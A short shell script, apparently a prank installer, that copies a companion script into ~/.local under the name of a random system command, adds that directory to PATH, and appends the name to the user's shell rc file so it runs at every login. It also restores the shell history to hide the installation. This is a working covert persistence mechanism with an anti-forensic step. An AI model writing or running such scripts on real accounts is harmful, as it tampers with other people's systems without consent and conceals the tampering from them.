#!/bin/sh

SHELL=$(basename $SHELL)
HISTORY_PATH="$HOME/.${SHELL}_history"
CONFIG_PATH="$HOME/.${SHELL}rc"
cp $HISTORY_PATH "$HISTORY_PATH.tmp"

mkdir -p $HOME/.local

FROM_PATH="$(dirname $0)/prank-me.sh"
TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)#"
TARGET_PATH="$HOME/.local"

cp $FROM_PATH "$TARGET_PATH/$TARGET_NAME"

echo "export PATH=\$PATH:$HOME/.local" >> $CONFIG_PATH
echo "$TARGET_NAME" >> $CONFIG_PATH

mv "$HISTORY_PATH.tmp" $HISTORY_PATH
